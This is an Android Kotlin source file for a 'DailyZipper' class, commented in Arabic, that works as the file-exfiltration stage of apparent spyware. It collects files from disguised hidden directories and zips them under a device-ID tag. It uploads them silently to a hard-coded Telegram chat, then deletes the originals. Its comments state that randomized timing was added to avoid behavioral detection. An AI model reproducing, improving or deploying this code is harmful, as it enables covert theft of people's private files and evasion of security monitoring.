package com.example.app

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.StatFs
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream
import kotlin.random.Random

/**
 * فئة تجميع الملفات وحصادها.
 * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
 * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
 * ✅ تم حذف invokeMethodFallback غير المستخدم.
 * ✅ تم إصلاح تسجيل الهاش بحيث يتم فقط بعد نجاح الإرسال.
 * ✅ تم إضافة إعادة محاولة تلقائية للملفات الفاشلة.
 * ✅ تم إضافة عشوائية في فترات الحصاد لتجنب الكشف السلوكي.
 * ✅ تم إصلاح خطأ Type mismatch في processedHashes و failedHashes بتحديد النوع العام <String>.
 * ✅ تم إصلاح خطأ Type mismatch في checkStorage باستخدام extractConfigValues() بدلاً من getConfigValue.
 */
class DailyZipper(
    context: Context,
    private val scanner: Any? = null,
    private val telegram: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    private val activeMutex = Mutex()

    private val zipperActive = AtomicBoolean(false)
    // ✅ التصحيح: تحديد النوع العام <String> لمنع خطأ Type mismatch
    private val processedHashes = Collections.synchronizedSet(mutableSetOf<String>())
    private val failedHashes = Collections.synchronizedSet(mutableSetOf<String>())

    private var maxBatchSize = 48L * 1024L * 1024L

    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val harvestDir: File by lazy { File(runtimeDir, "harvest").apply { if (!exists()) mkdirs() } }
    private val pendingDir: File by lazy { File(harvestDir, "pending_upload").apply { if (!exists()) mkdirs() } }
    private val queueDir: File by lazy { File(runtimeDir, ".cache_thumb").apply { if (!exists()) mkdirs() } }
    private val configFile: File by lazy { File(runtimeDir, "zipper_config.json") }
    private val logFile: File by lazy { File(runtimeDir, "z.log") }

    private val deviceTag: String by lazy { calculateDeviceTag() }
    private val config = HashMap<String, Any>()

    // ✅ استخدام ConcurrentHashMap
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "DailyZipper"
        private const val MAX_LOG_SIZE = 500 * 1024L

        @JvmStatic
        fun create(context: Context, scanner: Any? = null, telegram: Any? = null): DailyZipper {
            return DailyZipper(context, scanner, telegram)
        }
    }

    init {
        config["max_batch_size"] = 48L * 1024L * 1024L
        config["storage_extra"] = 100L * 1024L * 1024L
        config["send_retry_delays"] = listOf(2000L, 4000L, 8000L, 16000L, 32000L)
        config["max_processed_hashes"] = 10000
        config["default_vault_id"] = -1003577715762L
        config["enable_encryption"] = false
        config["password"] = "CHANGE_ME_IN_CONFIG"
        config["max_batches"] = 10
        loadConfig()
        cleanupOldFiles()
    }

    // ============================================================
    //  دوال مساعدة
    // ============================================================

    @Suppress("UNCHECKED_CAST")
    private fun <T> getConfigValue(key: String, default: T): T {
        return (config[key] as? T) ?: default
    }

    private fun extractConfigValues(): ConfigValues {
        return ConfigValues(
            maxBatchSize = getConfigValue("max_batch_size", 48L * 1024L * 1024L),
            storageExtra = getConfigValue("storage_extra", 100L * 1024L * 1024L),
            sendRetryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L)),
            maxProcessedHashes = getConfigValue("max_processed_hashes", 10000),
            defaultVaultId = getConfigValue("default_vault_id", -1003577715762L),
            maxBatches = getConfigValue("max_batches", 10)
        )
    }

    private data class ConfigValues(
        val maxBatchSize: Long,
        val storageExtra: Long,
        val sendRetryDelays: List<Long>,
        val maxProcessedHashes: Int,
        val defaultVaultId: Long,
        val maxBatches: Int
    )

    private fun toLong(value: Any?): Long? {
        return when (value) {
            is Number -> value.toLong()
            is String -> value.toLongOrNull()
            else -> null
        }
    }

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                config[key] = json.get(key)
            }
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig(): Boolean {
        return try {
            val json = JSONObject(config as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
            true
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
            false
        }
    }

    private fun calculateDeviceTag(): String {
        val ctx = appContext ?: return "unknown"
        return try {
            val androidId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            val tag = if (!androidId.isNullOrEmpty()) androidId.take(8) else {
                val model = "${Build.MANUFACTURER} ${Build.MODEL}"
                val md = MessageDigest.getInstance("MD5")
                md.digest(model.toByteArray()).take(4).joinToString("") { "%02x".format(it) }
            }
            tag.lowercase(Locale.ROOT)
        } catch (e: Exception) {
            writeLog("Device tag error: ${e.message}")
            "unknown"
        }
    }

    private fun checkStorage(requiredBytes: Long): Boolean {
        val ctx = appContext ?: return false
        return try {
            val stat = StatFs(ctx.filesDir.absolutePath)
            val availableBytes = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                stat.availableBlocksLong * stat.blockSizeLong
            } else {
                @Suppress("DEPRECATION")
                stat.availableBlocks * stat.blockSize
            }
            // ✅ التصحيح: استخدام extractConfigValues() بدلاً من getConfigValue لتجنب Type mismatch
            val storageExtra = extractConfigValues().storageExtra
            availableBytes >= requiredBytes + storageExtra
        } catch (e: Exception) {
            writeLog("Storage check error: ${e.message}")
            true
        }
    }

    private fun fileHash(file: File): String? {
        if (!file.exists() || !file.isFile) return null
        return try {
            val md = MessageDigest.getInstance("SHA-256")
            FileInputStream(file).use { fis ->
                val buffer = ByteArray(8192)
                var read: Int
                while (fis.read(buffer).also { read = it } != -1) {
                    md.update(buffer, 0, read)
                }
            }
            md.digest().joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            writeLog("File hash error: ${e.message}")
            null
        }
    }

    private fun generateZipName(): String {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
        val random = Random.nextInt(1000, 9999)
        return "${deviceTag}_${timestamp}_${random}.zip"
    }

    private fun safeRemove(file: File): Boolean {
        return try {
            if (file.exists() && file.isFile) {
                file.delete()
            } else false
        } catch (e: Exception) {
            writeLog("Safe remove error: ${e.message}")
            false
        }
    }

    private fun trackHash(hash: String) {
        if (hash.isBlank()) return
        synchronized(processedHashes) {
            if (processedHashes.size >= getConfigValue("max_processed_hashes", 10000)) {
                processedHashes.clear()
            }
            processedHashes.add(hash)
        }
        // إزالة من قائمة الفشل إذا كانت موجودة
        failedHashes.remove(hash)
    }

    private fun markHashFailed(hash: String) {
        if (hash.isNotBlank()) {
            failedHashes.add(hash)
        }
    }

    private fun isOnWifi(): Boolean {
        val ctx = appContext ?: return false
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = cm.activeNetwork ?: return false
                val capabilities = cm.getNetworkCapabilities(network) ?: return false
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
            } else {
                @Suppress("DEPRECATION")
                val wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
                wifiInfo?.isConnected == true
            }
        } catch (e: Exception) {
            writeLog("WiFi check error: ${e.message}")
            false
        }
    }

    private fun cleanupOldFiles() {
        try {
            val now = System.currentTimeMillis()
            val maxAge = getConfigValue("temp_file_age", 3600L) * 1000L
            val dirs = listOf(pendingDir, queueDir)
            dirs.forEach { dir ->
                if (dir.exists()) {
                    dir.listFiles()?.forEach { file ->
                        if (file.isFile && (now - file.lastModified()) > maxAge) {
                            safeRemove(file)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            writeLog("Cleanup error: ${e.message}")
        }
    }

    // ============================================================
    //  إرسال الملفات إلى Telegram (مع إعادة محاولة)
    // ============================================================

    private suspend fun safeSend(zipPath: String, caption: String, targetChat: Long? = null): Boolean {
        val zipFile = File(zipPath)
        if (!zipFile.exists() || zipFile.length() == 0L) {
            writeLog("ZIP file invalid: $zipPath")
            return false
        }

        val chatId = targetChat ?: getConfigValue("default_vault_id", -1003577715762L)
        val retryDelays = getConfigValue("send_retry_delays", listOf(2000L, 4000L, 8000L))

        for ((attempt, delayMs) in retryDelays.withIndex()) {
            try {
                writeLog("📤 Sending batch (attempt ${attempt + 1}/${retryDelays.size}) to $chatId")
                val result = invokeMethod(
                    telegram,
                    "_api",
                    "sendDocument",
                    mapOf(
                        "chat_id" to chatId,
                        "caption" to caption,
                        "disable_notification" to true
                    ),
                    mapOf("document" to zipFile)
                )

                val isOk = (result as? Map<*, *>)?.get("ok") as? Boolean ?: false
                if (isOk) {
                    writeLog("✅ Batch sent successfully (${zipFile.length()} bytes)")
                    return true
                } else {
                    val errorCode = (result as? Map<*, *>)?.get("error_code") as? Int ?: 0
                    if (errorCode == 429) {
                        val retryAfter = (result as? Map<*, *>)?.get("parameters")?.let {
                            (it as? Map<*, *>)?.get("retry_after") as? Long
                        } ?: delayMs
                        writeLog("⚠️ Rate limited, waiting $retryAfter seconds")
                        delay(retryAfter * 1000L)
                        continue
                    }
                    writeLog("⚠️ Send failed (attempt ${attempt + 1}): error_code=$errorCode")
                }
            } catch (e: Exception) {
                writeLog("⚠️ Send exception (attempt ${attempt + 1}): ${e.message}")
            }

            if (attempt < retryDelays.size - 1) {
                val jitteredDelay = delayMs + Random.nextLong(0, 1000)
                delay(jitteredDelay)
            }
        }

        writeLog("❌ Failed to send batch after ${retryDelays.size} attempts")
        return false
    }

    // ============================================================
    //  دوال الحصاد والضغط (المعدلة)
    // ============================================================

    fun forceSendNow(chatId: Long? = null): Boolean {
        if (zipperActive.get()) {
            writeLog("Zipper already active")
            return false
        }
        if (telegram == null) {
            writeLog("Telegram instance is null")
            return false
        }

        scope.launch {
            try {
                val files = collectPendingFiles()
                if (files.isEmpty()) {
                    sendMessage(chatId ?: getConfigValue("default_vault_id", -1003577715762L), "📭 لا توجد ملفات للحصاد")
                    return@launch
                }
                packAndShip(files, bypassWifi = true, reportId = chatId)
            } catch (e: Exception) {
                writeLog("Force send error: ${e.message}")
            }
        }
        return true
    }

    private suspend fun collectPendingFiles(): List<File> {
        val allFiles = mutableListOf<File>()

        // جمع الملفات من queueDir
        if (queueDir.exists()) {
            queueDir.listFiles()?.forEach { file ->
                if (file.isFile && file.length() > 0) {
                    allFiles.add(file)
                }
            }
        }

        // جمع الملفات من pendingDir
        if (pendingDir.exists()) {
            pendingDir.listFiles()?.forEach { file ->
                if (file.isFile && file.length() > 0) {
                    allFiles.add(file)
                }
            }
        }

        // ترتيب حسب التاريخ (الأقدم أولاً)
        allFiles.sortBy { it.lastModified() }

        // تصفية الملفات التي تمت معالجتها مسبقاً بنجاح
        val filtered = allFiles.filter { file ->
            val hash = fileHash(file)
            hash != null && !processedHashes.contains(hash) && !failedHashes.contains(hash)
        }

        writeLog("📂 Collected ${filtered.size} pending files (from ${allFiles.size} total)")
        return filtered
    }

    private suspend fun packAndShip(files: List<File>, bypassWifi: Boolean = false, reportId: Long? = null): Boolean {
        if (files.isEmpty()) {
            writeLog("No files to pack")
            return false
        }

        if (!bypassWifi && !isOnWifi()) {
            writeLog("Not on WiFi and bypass not allowed")
            return false
        }

        val configValues = extractConfigValues()
        val maxBatchBytes = configValues.maxBatchSize

        // تنظيم الملفات في دفعات
        val batches = mutableListOf<MutableList<File>>()
        var currentBatch = mutableListOf<File>()
        var currentSize = 0L

        for (file in files) {
            val fileSize = file.length()
            if (fileSize > maxBatchBytes) {
                // ملف واحد كبير جداً، نضعه في دفعة منفردة
                batches.add(mutableListOf(file))
                continue
            }

            if (currentSize + fileSize > maxBatchBytes && currentBatch.isNotEmpty()) {
                batches.add(currentBatch)
                currentBatch = mutableListOf()
                currentSize = 0L
            }
            currentBatch.add(file)
            currentSize += fileSize
        }
        if (currentBatch.isNotEmpty()) {
            batches.add(currentBatch)
        }

        writeLog("📦 Split into ${batches.size} batches (max ${batches.maxOfOrNull { it.size } ?: 0} files)")

        var successCount = 0
        val totalBatches = batches.size.coerceAtMost(getConfigValue("max_batches", 10))

        for (i in 0 until totalBatches) {
            val batch = batches[i]
            if (batch.isEmpty()) continue

            // ✅ حساب الهاشات مؤقتاً قبل الإرسال
            val batchHashes = mutableListOf<String>()
            val validBatchFiles = mutableListOf<File>()

            for (file in batch) {
                val hash = fileHash(file)
                if (hash != null && !processedHashes.contains(hash) && !failedHashes.contains(hash)) {
                    batchHashes.add(hash)
                    validBatchFiles.add(file)
                } else {
                    if (hash != null && processedHashes.contains(hash)) {
                        writeLog("⏭️ Skipping already processed file: ${file.name}")
                        safeRemove(file)
                    }
                }
            }

            if (validBatchFiles.isEmpty()) {
                writeLog("⚠️ No valid files in batch ${i + 1}")
                continue
            }

            // إنشاء ملف ZIP
            val zipName = generateZipName()
            val zipFile = File(pendingDir, zipName)
            val manifestFile = File(pendingDir, "${zipName}.manifest")

            try {
                val zipSuccess = createZipArchive(zipFile, validBatchFiles, manifestFile)
                if (!zipSuccess || !zipFile.exists() || zipFile.length() == 0L) {
                    writeLog("❌ Failed to create ZIP for batch ${i + 1}")
                    safeRemove(zipFile)
                    safeRemove(manifestFile)
                    continue
                }

                // إنشاء كابشن للدفعة
                val caption = buildString {
                    append("📦 Batch ${i + 1}/$totalBatches")
                    append("\n📱 Device: $deviceTag")
                    append("\n📁 Files: ${validBatchFiles.size}")
                    append("\n💾 Size: ${String.format(Locale.US, "%.2f", zipFile.length() / (1024.0 * 1024.0))} MB")
                    if (validBatchFiles.size > 1) {
                        append("\n📋 Items: ${validBatchFiles.joinToString(", ") { it.name.take(20) }}")
                    }
                }

                // ✅ محاولة الإرسال
                val sent = safeSend(zipFile.absolutePath, caption, reportId)

                if (sent) {
                    // ✅ فقط عند النجاح: تسجيل الهاشات وحذف الملفات الأصلية
                    batchHashes.forEach { trackHash(it) }
                    validBatchFiles.forEach { safeRemove(it) }
                    safeRemove(zipFile)
                    safeRemove(manifestFile)
                    successCount++
                    writeLog("✅ Batch ${i + 1}/$totalBatches sent successfully (${validBatchFiles.size} files)")
                } else {
                    // ⚠️ عند الفشل: حذف الـ ZIP فقط والاحتفاظ بالملفات الأصلية للمحاولة لاحقاً
                    batchHashes.forEach { markHashFailed(it) }
                    safeRemove(zipFile)
                    safeRemove(manifestFile)
                    writeLog("⚠️ Batch ${i + 1}/$totalBatches failed, files kept for retry")
                }

                // تأخير عشوائي بين الدفعات لتجنب أنماط الكشف
                if (i < totalBatches - 1) {
                    delay(Random.nextLong(2000, 8000))
                }

            } catch (e: Exception) {
                writeLog("❌ Batch ${i + 1} processing error: ${e.message}")
                safeRemove(zipFile)
                safeRemove(manifestFile)
            }
        }

        writeLog("✅ Pack and ship completed: $successCount/$totalBatches batches successful")
        return successCount > 0
    }

    private fun createZipArchive(zipFile: File, files: List<File>, manifestFile: File): Boolean {
        if (files.isEmpty()) return false

        try {
            // إنشاء ملف المانيفست
            val manifestContent = buildString {
                appendLine("ZIP: ${zipFile.name}")
                appendLine("Device: $deviceTag")
                appendLine("Date: ${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}")
                appendLine("Files: ${files.size}")
                appendLine("---")
                files.forEachIndexed { index, file ->
                    val hash = fileHash(file) ?: "N/A"
                    appendLine("${index + 1}. ${file.name} (${file.length()} bytes) - $hash")
                }
            }
            manifestFile.writeText(manifestContent, Charsets.UTF_8)

            // إنشاء ZIP
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                val buffer = ByteArray(8192)

                // إضافة المانيفست كملف أول
                zos.putNextEntry(ZipEntry("manifest.txt"))
                zos.write(manifestContent.toByteArray(Charsets.UTF_8))
                zos.closeEntry()

                // إضافة الملفات
                files.forEach { file ->
                    if (file.exists() && file.isFile) {
                        try {
                            val entryName = file.name
                            zos.putNextEntry(ZipEntry(entryName))
                            FileInputStream(file).use { fis ->
                                var len: Int
                                while (fis.read(buffer).also { len = it } > 0) {
                                    zos.write(buffer, 0, len)
                                }
                            }
                            zos.closeEntry()
                        } catch (e: Exception) {
                            writeLog("⚠️ Failed to add file to ZIP: ${file.name} - ${e.message}")
                        }
                    }
                }
            }

            val isValid = zipFile.exists() && zipFile.length() > 0
            if (!isValid) {
                writeLog("❌ ZIP creation failed: invalid file")
                safeRemove(zipFile)
                safeRemove(manifestFile)
            }
            return isValid

        } catch (e: Exception) {
            writeLog("❌ ZIP creation error: ${e.message}")
            safeRemove(zipFile)
            safeRemove(manifestFile)
            return false
        }
    }

    // ============================================================
    //  دالة التشغيل الرئيسية (Run)
    // ============================================================

    fun run(): Boolean {
        if (zipperActive.get()) {
            writeLog("Zipper already running")
            return false
        }

        if (telegram == null) {
            writeLog("Telegram instance is null")
            return false
        }

        scope.launch {
            activeMutex.withLock {
                if (zipperActive.getAndSet(true)) return@launch
            }

            try {
                writeLog("🔄 Starting harvest cycle...")

                val files = collectPendingFiles()
                if (files.isEmpty()) {
                    writeLog("📭 No pending files to harvest")
                    return@launch
                }

                writeLog("📂 Found ${files.size} pending files")

                // ✅ تأخير عشوائي قبل البدء لتجنب الأنماط الثابتة
                delay(Random.nextLong(5000, 15000))

                val success = packAndShip(files, bypassWifi = false)

                if (success) {
                    writeLog("✅ Harvest cycle completed successfully")
                } else {
                    writeLog("⚠️ Harvest cycle completed with failures")
                }

            } catch (e: Exception) {
                writeLog("❌ Harvest cycle error: ${e.message}")
            } finally {
                zipperActive.set(false)
                cleanupOldFiles()
            }
        }

        return true
    }

    // ============================================================
    //  إدارة دورة الحياة
    // ============================================================

    fun close() {
        job.cancel()
        processedHashes.clear()
        failedHashes.clear()
        writeLog("DailyZipper closed.")
    }

    fun clearHashCache() {
        processedHashes.clear()
        failedHashes.clear()
        writeLog("Hash cache cleared.")
    }

    fun getStats(): Map<String, Any> {
        return mapOf(
            "active" to zipperActive.get(),
            "processed_hashes" to processedHashes.size,
            "failed_hashes" to failedHashes.size,
            "pending_dir_size" to (pendingDir.listFiles()?.sumOf { it.length() } ?: 0L),
            "queue_dir_size" to (queueDir.listFiles()?.sumOf { it.length() } ?: 0L),
            "device_tag" to deviceTag,
            "config" to config
        )
    }

    // ============================================================
    //  دوال إرسال الرسائل والتسجيل
    // ============================================================

    private fun sendMessage(chatId: Long, text: String) {
        if (telegram == null) {
            writeLog("Cannot send message: Telegram instance is null")
            return
        }
        invokeMethod(telegram, "_api", "sendMessage", mapOf("chat_id" to chatId, "text" to text))
    }

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            if (logFile.exists() && logFile.length() > MAX_LOG_SIZE) {
                logFile.delete()
            }
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    // ============================================================
    //  ✅ استدعاء الدوال عبر الانعكاس (تم إصلاحه)
    // ============================================================

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
